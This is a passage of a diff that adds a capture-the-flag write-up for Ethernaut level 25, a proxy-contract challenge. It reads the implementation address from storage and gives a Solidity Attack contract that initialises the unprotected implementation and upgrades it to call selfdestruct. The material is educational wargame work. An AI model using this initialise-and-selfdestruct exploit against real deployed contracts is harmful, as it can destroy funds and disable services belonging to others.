@@ -92,3 +92,30 @@ contract Attack{
 ```
 
 ## Ethernaut 25 (proxy of the proxy)
+
+    1. We will use getStorageAt() to get the address of the implementation contract
+`await web3.eth.getStorageAt(contract.address,"_IMPLEMENTATION_SLOT")` 
+    
+    2. which is: 0x000000000000000000000000fd93a2ff533d97cab416f23d1c80c95cfe0e5bef
+    0xfd93a2ff533d97cab416f23d1c80c95cfe0e5bef
+
+    3. attack the implementation contract:
+
+```
+contract Attack{
+
+    function attack(address _target) public{
+        bytes memory functionSign = abi.encodeWithSignature("initialize()");
+        (bool success, ) = _target.call(functionSign);
+        require(success);
+        bytes memory calldestroy = abi.encodeWithSignature("destroy()");
+        bytes memory upgradeSign = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this),calldestroy);
+        (bool success2, ) = _target.call(upgradeSign);
+        require(success2);
+    }
+
+    function destroy() public{
+        selfdestruct(payable(address(0)));
+    }
+}
+```
